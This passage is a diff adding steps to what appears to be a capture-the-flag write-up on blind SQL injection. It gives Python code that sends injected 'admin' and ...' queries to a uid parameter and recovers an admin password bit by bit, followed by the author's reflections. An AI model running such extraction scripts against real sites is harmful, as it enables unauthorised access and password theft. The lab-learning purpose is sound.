@@ -184,8 +184,47 @@ def find_length():
         i += 1
 ```
 #### step 2. find bit length of each password character  
+```py
+def find_bit_length():
+    bit_length_db=[]
+    for i in range(1, 14):
+        bit_length = 0
+        while True:
+            query = f"admin' and char_length(bin(ord(substr(upw, {i},1)))) = '{bit_length}"
+            resp = requests.get(f"{host}?uid={query}")
+            if 'exist' in resp.text:
+                #print(bit_length)
+                bit_length_db.append(bit_length)
+                break;
+            bit_length+=1
+```
 #### step 3. extract bits of each password character  
+```py
+bits_db=[]
+for i in range(1, 14):
+    bits=''
+    for j in range(1, bit_length_db[i-1]+1):
+        query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))),{j},1) = '1"
+        resp = requests.get(f"{host}?uid={query}")
+        if 'exist' in resp.text:
+            bits+='1'
+        else:
+            bits+='0'
+    bits_db.append(bits)
+print(bits_db)
+```
 #### step 4. convert bits to letter  
+> To convert bits to letter  
+> step 4-1. convert bits to int  
+> step 4-2. convert int to Big Endian formed string  
+> step 4-3. encoding
+```py
+flag = ''
+for i in range(13):
+    flag += int.to_bytes(int(bits_db[i],2), length=bit_length_db[i]+7 // 8, byteorder='big').decode()
+print(flag)
+```  
+
 I didn't think about `step 2` fully, and `step 3` and `step 4` were hard to me to code.  
 But the concept of step 2 is important I think. I try without this concept. Thanks to it, I was confused with what bytes the character has.  
 So I used for-loop so that the bytes is fixed at one in python exploit code. In fact, ascii only take 1-byte while korean take 3-bytes in utf-8.  
